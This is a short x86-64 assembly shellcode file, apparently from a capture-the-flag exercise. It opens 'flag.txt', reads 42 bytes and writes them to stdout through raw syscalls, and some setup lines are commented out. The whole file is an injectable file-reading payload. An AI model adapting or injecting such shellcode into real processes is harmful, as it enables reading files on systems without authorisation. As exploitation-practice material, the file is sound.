BITS 64

; store flag.txt on the stack
;    mov  rax, 8392585648256674918
    mov     [rsp], rax
    mov     [rsp+8], rbx

    mov     rdi, rsp   ; const char *filename
;    mov     rsi, 0     ; int flags
;    mov     rdx, 0     ; int mode
    mov     rax, 2     ; sys_open
    syscall

;    mov     r15, rax   ; save file descriptor

    mov     rdi, rax   ; unsigned int fd
    mov     rsi, rsp   ; char *buf
    mov     rdx, 42    ; size_t count
    xor     rax, rax   ; sys_read
    syscall

    mov     rdi, 1      ; unsigned int fd = stdout
;    mov     rsi, rsp   ; const char *buf
;    mov     rdx, 42    ; size_t count
    mov     rax, rdi    ; sys_write = 1
    syscall
